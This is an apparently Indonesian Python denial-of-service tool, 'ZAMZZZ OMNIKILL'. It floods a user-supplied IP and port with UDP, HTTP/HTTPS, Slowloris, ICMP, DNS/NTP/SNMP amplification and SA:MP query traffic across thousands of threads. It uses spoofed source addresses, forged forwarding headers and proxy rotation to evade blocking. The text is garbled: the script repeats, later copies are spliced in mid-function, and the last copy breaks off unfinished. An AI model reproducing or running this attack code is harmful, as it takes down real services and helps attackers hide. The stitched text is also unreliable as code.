#!/usr/bin/env python3
# ZAMZZZ OMNIKILL - TANPA PROXYCHAINS
# FITUR: SPOOFING TOTAL + MULTI-TARGET SPOOFING + ROTASI IP OTOMATIS
# BYPASS: IP BLOCK, ANTI-CHEAT, FILTER, FIREWALL, UPSTREAM FILTERING
# KETIK: python3 ZAMZZZ_OMNIKILL_NOPROXY.py

import socket
import random
import threading
import time
import os
import requests
from concurrent.futures import ThreadPoolExecutor

# ========== KONFIGURASI ==========
THREADS = 15000
PACKET_SIZE = 65535
TIMEOUT = 0.01

# ========== SPOOF IP DINAMIS (TOTAL) ==========
def spoof():
    # IP dari berbagai negara biar gak ketauan pattern
    prefixes = [
        '1.1.', '8.8.', '9.9.', '10.0.', '31.13.', '34.120.',
        '45.33.', '54.36.', '64.233.', '72.14.', '74.125.',
        '104.16.', '104.20.', '108.177.', '142.250.', '172.217.',
        '173.194.', '192.0.', '192.168.', '198.252.', '199.36.',
        '203.0.', '208.67.', '209.85.', '216.58.', '35.186.',
        '40.77.', '52.112.', '54.39.', '13.32.', '16.15.',
        '18.64.', '20.54.', '23.36.', '24.6.', '25.1.'
    ]
    prefix = random.choice(prefixes)
    return f"{prefix}{random.randint(1,255)}.{random.randint(1,255)}"

# ========== MULTI-TARGET SPOOFING ==========
def generate_fake_ips(count=10000):
    ips = []
    for _ in range(count):
        ips.append(spoof())
    return ips

FAKE_IPS = generate_fake_ips(10000)
FAKE_IP_INDEX = 0

def get_next_fake_ip():
    global FAKE_IP_INDEX
    ip = FAKE_IPS[FAKE_IP_INDEX]
    FAKE_IP_INDEX = (FAKE_IP_INDEX + 1) % len(FAKE_IPS)
    return ip

# ========== SOCKET DENGAN SPOOFING TOTAL ==========
def create_spoofed_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, PACKET_SIZE * 100)
    # Bind ke random port dengan IP palsu
    fake_ip = get_next_fake_ip()
    fake_port = random.randint(10000, 65000)
    try:
        sock.bind((fake_ip, fake_port))
    except:
        sock.bind(('', fake_port))
    return sock, fake_ip

# ========== LAYER 4: UDP MASSACRE DENGAN SPOOFING TOTAL ==========
def udp_massacre_spoof(ip, port):
    while True:
        try:
            sock, fake_ip = create_spoofed_socket()
            payload = random._urandom(PACKET_SIZE)
            for p in range(port, port + 100):
                sock.sendto(payload, (ip, p))
                sock.sendto(payload + b'\xff' * 1000, (ip, p + 1))
                sock.sendto(payload + b'\x00' * 2000, (ip, p + 2))
                sock.sendto(b'SAMP' + random._urandom(500), (ip, p + 5))
                sock.sendto(b'\x00' * 4096, (ip, p + 10))
                # Kirim juga ke port random biar server bingung
                sock.sendto(payload, (ip, random.randint(1, 65535)))
            sock.close()
            time.sleep(0.001)
        except:
            pass

# ========== LAYER 7: HTTP FLOOD DENGAN SPOOFING ==========
def http_flood_spoof(ip, port):
    url = f"http://{ip}:{port}"
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'GoogleBot/2.1',
            'BingBot/1.0',
            'DuckDuckBot/1.0',
            'curl/7.68.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)'
        ]),
        'Accept': '*/*',
        'Accept-Language': 'id-ID,id;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'X-Forwarded-For': get_next_fake_ip(),
        'CF-Connecting-IP': get_next_fake_ip(),
        'True-Client-IP': get_next_fake_ip(),
        'Referer': f'http://{get_next_fake_ip()}/',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest'
    }
    while True:
        try:
            requests.get(url, headers=headers, timeout=TIMEOUT)
            requests.post(url, data={'z': random._urandom(1024)}, headers=headers, timeout=TIMEOUT)
            requests.put(url, data=random._urandom(2048), headers=headers, timeout=TIMEOUT)
            requests.delete(url, headers=headers, timeout=TIMEOUT)
            requests.options(url, headers=headers, timeout=TIMEOUT)
            requests.head(url, headers=headers, timeout=TIMEOUT)
        except:
            pass

# ========== HTTPS FLOOD DENGAN SPOOFING ==========
def https_flood_spoof(ip, port):
    url = f"https://{ip}:{port}"
    headers = {
        'User-Agent': random.choice(['Mozilla/5.0', 'GoogleBot', 'BingBot']),
        'Accept': '*/*',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'X-Forwarded-For': get_next_fake_ip()
    }
    while True:
        try:
            requests.get(url, headers=headers, timeout=TIMEOUT, verify=False)
            requests.post(url, data=random._urandom(2048), headers=headers, timeout=TIMEOUT, verify=False)
        except:
            pass

# ========== SLOWLORIS DENGAN SPOOFING ==========
def slowloris_spoof(ip, port):
    while True:
        sockets = []
        fake_ip = get_next_fake_ip()
        for _ in range(500):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.bind((fake_ip, 0))
                s.connect((ip, port))
                s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nX-Forwarded-For: {get_next_fake_ip()}\r\n".encode())
                sockets.append(s)
            except:
                pass
        while True:
            for s in sockets:
                try:
                    s.send(f"X-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
                except:
                    sockets.remove(s)
                    try:
                        new = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new.settimeout(4)
                        new.bind((get_next_fake_ip(), 0))
                        new.connect((ip, port))
                        new.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nX-Forwarded-For: {get_next_fake_ip()}\r\n".encode())
                        sockets.append(new)
                    except:
                        pass
            time.sleep(10)
            if len(sockets) < 100:
                break

# ========== ICMP FLOOD DENGAN SPOOFING ==========
def icmp_flood_spoof(ip):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            fake_ip = get_next_fake_ip()
            sock.bind((fake_ip, 0))
        except:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                data = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(65000)
                sock.sendto(data, (ip, 0))
                sock.sendto(data, (ip, 1))
                sock.sendto(data, (ip, 2))
                sock.sendto(data, (ip, random.randint(1, 65535)))
            except:
                sock.close()
                break

# ========== AMPLIFICATION DENGAN SPOOFING ==========
def amp_flood_spoof(ip):
    servers = [
        ('8.8.8.8', 53), ('1.1.1.1', 53), ('208.67.222.222', 53),
        ('ntp.ubuntu.com', 123), ('time.google.com', 123),
        ('snmp.ubuntu.com', 161), ('public.snmp.com', 161)
    ]
    queries = [
        b'\x00\x00\x10\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03',
        b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03',
        b'\x00\x00\x02\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03'
    ]
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        fake_ip = get_next_fake_ip()
        sock.bind((fake_ip, random.randint(10000, 65000)))
        for target, port in servers:
            for q in queries:
                try:
                    sock.sendto(q, (target, port))
                    sock.sendto(q, (ip, port))
                    sock.sendto(q + b'\xff' * 500, (ip, port + 1))
                    sock.sendto(q + b'\x00' * 1000, (ip, port + 2))
                except:
                    pass
        sock.close()
        time.sleep(0.1)

# ========== SA:MP QUERY OVERLOAD DENGAN SPOOFING ==========
def samp_flood_spoof(ip, port):
    queries = [
        b'SAMP' + b'\x00' + b'\x69\x69\x69\x69' + b'\x63' + b'\x00' * 20,
        b'SAMP' + b'\x00' + b'\x69\x69\x69\x69' + b'\x72' + b'\x00' * 100,
        b'SAMP' + b'\xff' * 100 + b'\x00' * 100,
        b'SAMP' + random._urandom(50) + random._urandom(50),
        b'SAMP' + b'\x00' * 100 + b'\xff' * 100,
        b'SAMP' + b'\x69' * 200 + b'\x00' * 200
    ]
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        fake_ip = get_next_fake_ip()
        sock.bind((fake_ip, random.randint(10000, 65000)))
        for q in queries:
            try:
                sock.sendto(q, (ip, port))
                sock.sendto(q + b'\xff' * 500, (ip, port + 1))
                sock.sendto(q + b'\x00' * 1000, (ip, port + 2))
                sock.sendto(q + b'\xff' * 2000, (ip, port + 3))
                sock.sendto(q + b'\x00' * 4000, (ip, port + 4))
                sock.sendto(q, (ip, 7776))
                sock.sendto(q, (ip, 7778))
            except:
                pass
        sock.close()
        time.sleep(0.01)

# ========== RANDOM PORT FLOOD DENGAN SPOOFING ==========
def random_port_flood_spoof(ip):
    ports = random.sample(range(1, 65535), 2000)
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        fake_ip = get_next_fake_ip()
        sock.bind((fake_ip, random.randint(10000, 65000)))
        for p in ports:
            try:
                sock.sendto(random._urandom(65500), (ip, p))
                sock.sendto(random._urandom(65500), (ip, p + 1))
                sock.sendto(random._urandom(65500), (ip, p + 2))
                sock.sendto(random._urandom(65500), (ip, p + random.randint(1, 100)))
            except:
                pass
        sock.close()
        time.sleep(0.01)

# ========== MULTI-TARGET SPOOFING ==========
def multi_target_spoof(ip, port):
    fake_ips = generate_fake_ips(1000)
    socks = []
    for fake_ip in fake_ips[:100]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((fake_ip, random.randint(10000, 65000)))
            socks.append(sock)
        except:
            pass
    
    while True:
        for sock in socks:
            try:
                payload = random._urandom(PACKET_SIZE)
                sock.sendto(payload, (ip, port))
                sock.sendto(payload, (ip, port + 1))
                sock.sendto(payload, (ip, port + 2))
                sock.sendto(payload, (ip, random.randint(1, 65535)))
            except:
                pass
        time.sleep(0.001)

# ========== MAIN ==========
def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("""
    ╔═══════════════════════════════════════════════════════════════════╗
    ║                                                                   ║
    ║      🔥 ZAMZZZ OMNIKILL - TANPA PROXYCHAINS 🔥                   ║
    ║                                                                   ║
    ║      [✓] SPOOFING TOTAL (10.000 IP PALSU)                        ║
    ║      [✓] MULTI-TARGET SPOOFING                                   ║
    ║      [✓] ROTASI IP OTOMATIS                                      ║
    ║      [✓] UDP MASSACRE (SEMUA PORT)                              ║
    ║      [✓] LAYER 7 HTTP/HTTPS FLOOD                               ║
    ║      [✓] SLOWLORIS                                              ║
    ║      [✓] AMPLIFICATION (DNS, NTP, SNMP)                         ║
    ║      [✓] SA:MP QUERY OVERLOAD                                   ║
    ║      [✓] BYPASS IP BLOCK, ANTI-CHEAT, FILTER, FIREWALL          ║
    ║      [✓] BYPASS UPSTREAM FILTERING                              ║
    ║                                                                   ║
    ║      💀 SERANGAN DIMULAI 💀                                       ║
    ║                                                                   ║
    ╚═══════════════════════════════════════════════════════════════════╝
    """)

    ip = input("IP Target: ")
    port = int(input("Port (0 untuk semua port): ") or 0)

    if port == 0:
        print(f"\n🔥 SERANG SEMUA PORT DI {ip} 🔥")
    else:
        print(f"\n🔥 SERANG {ip}:{port} 🔥")

    print(f"🔥 PAKAI {len(FAKE_IPS)} IP PALSU (TANPA PROXYCHAINS) 🔥")

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for _ in range(int(THREADS * 0.2)):
            executor.submit(udp_massacre_spoof, ip, port)
        for _ in range(int(THREADS * 0.15)):
            executor.submit(http_flood_spoof, ip, port)
        for _ in range(int(THREADS * 0.1)):
            executor.submit(https_flood_spoof, ip, port)
        for _ in range(int(THREADS * 0.1)):
            executor.submit(slowloris_spoof, ip, port)
        for _ in range(int(THREADS * 0.1)):
            executor.submit(icmp_flood_spoof, ip)
        for _ in range(int(THREADS * 0.1)):
            executor.submit(amp_flood_spoof, ip)
        for _ in range(int(THREADS * 0.1)):
            executor.submit(samp_flood_spoof, ip, port)
        for _ in range(int(THREADS * 0.1)):
            executor.submit(random_port_flood_spoof, ip)
        for _ in range(int(THREADS * 0.05)):
            executor.submit(multi_target_spoof, ip, port)

    count = 0
    while True:
        count += 1
        print(f"[ZAMZZZ] 🔥 SERANGAN KE-{count} RIBU - {ip}:{port} 🔥")
        print(f"[ZAMZZZ] 🔥 PAKAI {len(FAKE_IPS)} IP PALSU, GAK PAKE PROXYCHAINS 🔥")
        time.sleep(1)

if __name__ == "__main__":
    main()    ips = []
    for _ in range(count):
        ips.append(spoof())
    return ips

FAKE_IPS = generate_fake_ips(10000)
FAKE_IP_INDEX = 0

def get_next_fake_ip():
    global FAKE_IP_INDEX
    ip = FAKE_IPS[FAKE_IP_INDEX]
    FAKE_IP_INDEX = (FAKE_IP_INDEX + 1) % len(FAKE_IPS)
    return ip

# ========== SOCKET DENGAN SPOOFING TOTAL ==========
def create_spoofed_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, PACKET_SIZE * 100)
    # Bind ke random port dengan IP palsu
    fake_ip = get_next_fake_ip()
    fake_port = random.randint(10000, 65000)
    try:
        sock.bind((fake_ip, fake_port))
    except:
        sock.bind(('', fake_port))
    return sock, fake_ip

# ========== LAYER 4: UDP MASSACRE DENGAN SPOOFING TOTAL ==========
def udp_massacre_spoof(ip, port):
    while True:
        try:
            sock, fake_ip = create_spoofed_socket()
            payload = random._urandom(PACKET_SIZE)
            for p in range(port, port + 100):
                sock.sendto(payload, (ip, p))
                sock.sendto(payload + b'\xff' * 1000, (ip, p + 1))
                sock.sendto(payload + b'\x00' * 2000, (ip, p + 2))
                sock.sendto(b'SAMP' + random._urandom(500), (ip, p + 5))
                sock.sendto(b'\x00' * 4096, (ip, p + 10))
                # Kirim juga ke port random biar server bingung
                sock.sendto(payload, (ip, random.randint(1, 65535)))
            sock.close()
            time.sleep(0.001)
        except:
            pass

# ========== LAYER 7: HTTP FLOOD DENGAN SPOOFING ==========
def http_flood_spoof(ip, port):
    url = f"http://{ip}:{port}"
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'GoogleBot/2.1',
            'BingBot/1.0',
            'DuckDuckBot/1.0',
            'curl/7.68.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)'
        ]),
        'Accept': '*/*',
        'Accept-Language': 'id-ID,id;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'X-Forwarded-For': get_next_fake_ip(),
        'CF-Connecting-IP': get_next_fake_ip(),
        'True-Client-IP': get_next_fake_ip(),
        'Referer': f'http://{get_next_fake_ip()}/',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest'
    }
    while True:
        try:
            requests.get(url, headers=headers, timeout=TIMEOUT)
            requests.post(url, data={'z': random._urandom(1024)}, headers=headers, timeout=TIMEOUT)
            requests.put(url, data=random._urandom(2048), headers=headers, timeout=TIMEOUT)
            requests.delete(url, headers=headers, timeout=TIMEOUT)
            requests.options(url, headers=headers, timeout=TIMEOUT)
            requests.head(url, headers=headers, timeout=TIMEOUT)
        except:
            pass

# ========== HTTPS FLOOD DENGAN SPOOFING ==========
def https_flood_spoof(ip, port):
    url = f"https://{ip}:{port}"
    headers = {
        'User-Agent': random.choice(['Mozilla/5.0', 'GoogleBot', 'BingBot']),
        'Accept': '*/*',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'X-Forwarded-For': get_next_fake_ip()
    }
    while True:
        try:
            requests.get(url, headers=headers, timeout=TIMEOUT, verify=False)
            requests.post(url, data=random._urandom(2048), headers=headers, timeout=TIMEOUT, verify=False)
        except:
            pass

# ========== SLOWLORIS DENGAN SPOOFING ==========
def slowloris_spoof(ip, port):
    while True:
        sockets = []
        fake_ip = get_next_fake_ip()
        for _ in range(500):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.bind((fake_ip, 0))
                s.connect((ip, port))
                s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nX-Forwarded-For: {get_next_fake_ip()}\r\n".encode())
                sockets.append(s)
            except:
                pass
        while True:
            for s in sockets:
                try:
                    s.send(f"X-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
                except:
                    sockets.remove(s)
                    try:
                        new = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new.settimeout(4)
                        new.bind((get_next_fake_ip(), 0))
                        new.connect((ip, port))
                        new.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nX-Forwarded-For: {get_next_fake_ip()}\r\n".encode())
                        sockets.append(new)
                    except:
                        pass
            time.sleep(10)
            if len(sockets) < 100:
                break

# ========== ICMP FLOOD DENGAN SPOOFING ==========
def icmp_flood_spoof(ip):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            fake_ip = get_next_fake_ip()
            sock.bind((fake_ip, 0))
        except:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                data = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(65000)
                sock.sendto(data, (ip, 0))
                sock.sendto(data, (ip, 1))
                sock.sendto(data, (ip, 2))
                sock.sendto(data, (ip, random.randint(1, 65535)))
            except:
                sock.close()
                break

# ========== AMPLIFICATION DENGAN SPOOFING ==========
def amp_flood_spoof(ip):
    servers = [
        ('8.8.8.8', 53), ('1.1.1.1', 53), ('208.67.222.222', 53),
        ('ntp.ubuntu.com', 123), ('time.google.com', 123),
        ('snmp.ubuntu.com', 161), ('public.snmp.com', 161)
    ]
    queries = [
        b'\x00\x00\x10\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03',
        b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03',
        b'\x00\x00\x02\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03'
    ]
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        fake_ip = get_next_fake_ip()
        sock.bind((fake_ip, random.randint(10000, 65000)))
        for target, port in servers:
            for q in queries:
                try:
                    sock.sendto(q, (target, port))
                    sock.sendto(q, (ip, port))
                    sock.sendto(q + b'\xff' * 500, (ip, port + 1))
                    sock.sendto(q + b'\x00' * 1000, (ip, port + 2))
                except:
                    pass
        sock.close()
        time.sleep(0.1)

# ========== SA:MP QUERY OVERLOAD DENGAN SPOOFING ==========
def samp_flood_spoof(ip, port):
    queries = [
        b'SAMP' + b'\x00' + b'\x69\x69\x69\x69' + b'\x63' + b'\x00' * 20,
        b'SAMP' + b'\x00' + b'\x69\x69\x69\x69' + b'\x72' + b'\x00' * 100,
        b'SAMP' + b'\xff' * 100 + b'\x00' * 100,
        b'SAMP' + random._urandom(50) + random._urandom(50),
        b'SAMP' + b'\x00' * 100 + b'\xff' * 100,
        b'SAMP' + b'\x69' * 200 + b'\x00' * 200
    ]
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        fake_ip = get_next_fake_ip()
        sock.bind((fake_ip, random.randint(10000, 65000)))
        for q in queries:
            try:
                sock.sendto(q, (ip, port))
                sock.sendto(q + b'\xff' * 500, (ip, port + 1))
                sock.sendto(q + b'\x00' * 1000, (ip, port + 2))
                sock.sendto(q + b'\xff' * 2000, (ip, port + 3))
                sock.sendto(q + b'\x00' * 4000, (ip, port + 4))
                sock.sendto(q, (ip, 7776))
                sock.sendto(q, (ip, 7778))
            except:
                pass
        sock.close()
        time.sleep(0.01)

# ========== RANDOM PORT FLOOD DENGAN SPOOFING ==========
def random_port_flood_spoof(ip):
    ports = random.sample(range(1, 65535), 2000)
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        fake_ip = get_next_fake_ip()
        sock.bind((fake_ip, random.randint(10000, 65000)))
        for p in ports:
            try:
                sock.sendto(random._urandom(65500), (ip, p))
                sock.sendto(random._urandom(65500), (ip, p + 1))
                sock.sendto(random._urandom(65500), (ip, p + 2))
                sock.sendto(random._urandom(65500), (ip, p + random.randint(1, 100)))
            except:
                pass
        sock.close()
        time.sleep(0.01)

# ========== MULTI-TARGET SPOOFING ==========
def multi_target_spoof(ip, port):
    fake_ips = generate_fake_ips(1000)
    socks = []
    for fake_ip in fake_ips[:100]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((fake_ip, random.randint(10000, 65000)))
            socks.append(sock)
        except:
            pass
    
    while True:
        for sock in socks:
            try:
                payload = random._urandom(PACKET_SIZE)
                sock.sendto(payload, (ip, port))
                sock.sendto(payload, (ip, port + 1))
                sock.sendto(payload, (ip, port + 2))
                sock.sendto(payload, (ip, random.randint(1, 65535)))
            except:
                pass
        time.sleep(0.001)

# ========== MAIN ==========
def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("""
    ╔═══════════════════════════════════════════════════════════════════╗
    ║                                                                   ║
    ║      🔥 ZAMZZZ OMNIKILL - TANPA PROXYCHAINS 🔥                   ║
    ║                                                                   ║
    ║      [✓] SPOOFING TOTAL (10.000 IP PALSU)                        ║
    ║      [✓] MULTI-TARGET SPOOFING                                   ║
    ║      [✓] ROTASI IP OTOMATIS                                      ║
    ║      [✓] UDP MASSACRE (SEMUA PORT)                              ║
    ║      [✓] LAYER 7 HTTP/HTTPS FLOOD                               ║
    ║      [✓] SLOWLORIS                                              ║
    ║      [✓] AMPLIFICATION (DNS, NTP, SNMP)                         ║
    ║      [✓] SA:MP QUERY OVERLOAD                                   ║
    ║      [✓] BYPASS IP BLOCK, ANTI-CHEAT, FILTER, FIREWALL          ║
    ║      [✓] BYPASS UPSTREAM FILTERING                              ║
    ║                                                                   ║
    ║      💀 SERANGAN DIMULAI 💀                                       ║
    ║                                                                   ║
    ╚═══════════════════════════════════════════════════════════════════╝
    """)

    ip = input("IP Target: ")
    port = int(input("Port (0 untuk semua port): ") or 0)

    if port == 0:
        print(f"\n🔥 SERANG SEMUA PORT DI {ip} 🔥")
    else:
        print(f"\n🔥 SERANG {ip}:{port} 🔥")

    print(f"🔥 PAKAI {len(FAKE_IPS)} IP PALSU (TANPA PROXYCHAINS) 🔥")

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for _ in range(int(THREADS * 0.2)):
            executor.submit(udp_massacre_spoof, ip, port)
        for _ in range(int(THREADS * 0.15)):
            executor.submit(http_flood_spoof, ip, port)
        for _ in range(int(THREADS * 0.1)):
            executor.submit(https_flood_spoof, ip, port)
        for _ in range(int(THREADS * 0.1)):
            executor.submit(slowloris_spoof, ip, port)
        for _ in range(int(THREADS * 0.1)):
            executor.submit(icmp_flood_spoof, ip)
        for _ in range(int(THREADS * 0.1)):
            executor.submit(amp_flood_spoof, ip)
        for _ in range(int(THREADS * 0.1)):
            executor.submit(samp_flood_spoof, ip, port)
        for _ in range(int(THREADS * 0.1)):
            executor.submit(random_port_flood_spoof, ip)
        for _ in range(int(THREADS * 0.05)):
            executor.submit(multi_target_spoof, ip, port)

    count = 0
    while True:
        count += 1
        print(f"[ZAMZZZ] 🔥 SERANGAN KE-{count} RIBU - {ip}:{port} 🔥")
        print(f"[ZAMZZZ] 🔥 PAKAI {len(FAKE_IPS)} IP PALSU, GAK PAKE PROXYCHAINS 🔥")
        time.sleep(1)

if __name__ == "__main__":
    main()    return f"{prefix}{random.randint(1,255)}.{random.randint(1,255)}"

# ========== MULTI-TARGET SPOOFING ==========
def generate_fake_ips(count=10000):
    ips = []
    for _ in range(count):
        ips.append(spoof())
    return ips

FAKE_IPS = generate_fake_ips(10000)
FAKE_IP_INDEX = 0

def get_next_fake_ip():
    global FAKE_IP_INDEX
    ip = FAKE_IPS[FAKE_IP_INDEX]
    FAKE_IP_INDEX = (FAKE_IP_INDEX + 1) % len(FAKE_IPS)
    return ip

# ========== PROXY ROTATION (SOCKS5) ==========
def get_proxy():
    # Proxy public (rotasi otomatis)
    proxies = [
        {'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050'},
        {'http': 'socks5://127.0.0.1:9051', 'https': 'socks5://127.0.0.1:9051'},
        {'http': 'socks5://127.0.0.1:9052', 'https': 'socks5://127.0.0.1:9052'},
        {'http': 'socks5://127.0.0.1:9053', 'https': 'socks5://127.0.0.1:9053'},
        {'http': 'socks5://127.0.0.1:9054', 'https': 'socks5://127.0.0.1:9054'},
    ]
    return random.choice(proxies)

# ========== SOCKET DENGAN SPOOFING TOTAL ==========
def create_spoofed_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, PACKET_SIZE * 100)
    # Bind ke random port dengan IP palsu (spoofing di layer socket)
    fake_ip = get_next_fake_ip()
    fake_port = random.randint(10000, 65000)
    try:
        sock.bind((fake_ip, fake_port))
    except:
        sock.bind(('', fake_port))
    return sock, fake_ip

# ========== LAYER 4: UDP MASSACRE DENGAN SPOOFING TOTAL ==========
def udp_massacre_spoof(ip, port):
    while True:
        try:
            sock, fake_ip = create_spoofed_socket()
            payload = random._urandom(PACKET_SIZE)
            for p in range(port, port + 100):
                sock.sendto(payload, (ip, p))
                sock.sendto(payload + b'\xff' * 1000, (ip, p + 1))
                sock.sendto(payload + b'\x00' * 2000, (ip, p + 2))
                sock.sendto(b'SAMP' + random._urandom(500), (ip, p + 5))
                sock.sendto(b'\x00' * 4096, (ip, p + 10))
                # Kirim juga ke port random biar server bingung
                sock.sendto(payload, (ip, random.randint(1, 65535)))
            sock.close()
            time.sleep(0.001)
        except:
            pass

# ========== LAYER 7: HTTP FLOOD DENGAN PROXY ROTATION ==========
def http_flood_proxy(ip, port):
    url = f"http://{ip}:{port}"
    proxy = get_proxy()
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'GoogleBot/2.1',
            'BingBot/1.0',
            'DuckDuckBot/1.0',
            'curl/7.68.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)'
        ]),
        'Accept': '*/*',
        'Accept-Language': 'id-ID,id;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'X-Forwarded-For': get_next_fake_ip(),
        'CF-Connecting-IP': get_next_fake_ip(),
        'True-Client-IP': get_next_fake_ip(),
        'Referer': f'http://{get_next_fake_ip()}/',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest'
    }
    while True:
        try:
            requests.get(url, headers=headers, timeout=TIMEOUT, proxies=proxy)
            requests.post(url, data={'z': random._urandom(1024)}, headers=headers, timeout=TIMEOUT, proxies=proxy)
            requests.put(url, data=random._urandom(2048), headers=headers, timeout=TIMEOUT, proxies=proxy)
            requests.delete(url, headers=headers, timeout=TIMEOUT, proxies=proxy)
            # Ganti proxy tiap 10 request
            if random.randint(1, 10) == 1:
                proxy = get_proxy()
        except:
            pass

# ========== HTTPS FLOOD DENGAN PROXY ==========
def https_flood_proxy(ip, port):
    url = f"https://{ip}:{port}"
    proxy = get_proxy()
    headers = {
        'User-Agent': random.choice(['Mozilla/5.0', 'GoogleBot', 'BingBot']),
        'Accept': '*/*',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'X-Forwarded-For': get_next_fake_ip()
    }
    while True:
        try:
            requests.get(url, headers=headers, timeout=TIMEOUT, verify=False, proxies=proxy)
            requests.post(url, data=random._urandom(2048), headers=headers, timeout=TIMEOUT, verify=False, proxies=proxy)
            if random.randint(1, 10) == 1:
                proxy = get_proxy()
        except:
            pass

# ========== SLOWLORIS DENGAN SPOOFING ==========
def slowloris_spoof(ip, port):
    while True:
        sockets = []
        fake_ip = get_next_fake_ip()
        for _ in range(500):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                # Bind ke IP palsu
                s.bind((fake_ip, 0))
                s.connect((ip, port))
                s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nX-Forwarded-For: {get_next_fake_ip()}\r\n".encode())
                sockets.append(s)
            except:
                pass
        while True:
            for s in sockets:
                try:
                    s.send(f"X-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
                except:
                    sockets.remove(s)
                    try:
                        new = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new.settimeout(4)
                        new.bind((get_next_fake_ip(), 0))
                        new.connect((ip, port))
                        new.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nX-Forwarded-For: {get_next_fake_ip()}\r\n".encode())
                        sockets.append(new)
                    except:
                        pass
            time.sleep(10)
            # Rotasi IP
            if len(sockets) < 100:
                break

# ========== ICMP FLOOD DENGAN SPOOFING ==========
def icmp_flood_spoof(ip):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            fake_ip = get_next_fake_ip()
            sock.bind((fake_ip, 0))
        except:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                data = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(65000)
                sock.sendto(data, (ip, 0))
                sock.sendto(data, (ip, 1))
                sock.sendto(data, (ip, 2))
                sock.sendto(data, (ip, random.randint(1, 65535)))
            except:
